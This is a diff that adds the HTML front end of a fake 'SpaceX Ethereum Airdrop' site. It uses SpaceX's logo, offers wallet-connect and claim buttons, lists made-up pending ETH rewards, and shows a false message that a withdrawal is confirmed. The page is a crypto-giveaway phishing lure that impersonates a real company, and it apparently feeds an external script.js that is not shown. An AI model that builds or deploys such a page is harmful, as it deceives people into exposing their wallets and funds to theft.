@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SpaceX ETH Airdrop | Claim Free ETH Tokens</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <div class="bg-layer"></div>
+  <div class="stars"></div>
+
+  <div class="airdrop-container">
+    <div class="logo-area">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/de/SpaceX-Logo.svg/1920px-SpaceX-Logo.svg.png" alt="SpaceX Logo" class="logo" />
+      <h1>SpaceX Ethereum Airdrop</h1>
+      <p class="subheading">Celebrating decentralized technology with an ETH giveaway</p>
+    </div>
+
+    <div class="wallet-actions">
+      <button id="connectBtn">🔗 Connect Wallet</button>
+      <button id="claimBtn">🎁 Claim Airdrop</button>
+      <div id="status" class="status-text">Wallet not connected</div>
+    </div>
+
+    <div id="pendingBox" class="pending-section hidden">
+      <h3>⏳ Your ETH Reward is Processing</h3>
+      <p>Select your pending ETH drop:</p>
+      <select id="ethDropdown">
+        <option disabled selected>Select amount</option>
+        <option>0.021 ETH</option>
+        <option>0.045 ETH</option>
+        <option>0.063 ETH</option>
+        <option>0.081 ETH</option>
+      </select>
+      <div class="confirm-message">
+        ✅ Your ETH withdrawal is confirmed and will be sent to your wallet shortly.
+      </div>
+    </div>
+
+    <p class="footer-note">© 2025 SpaceXETH.org — Powered by Ethereum Layer 2</p>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
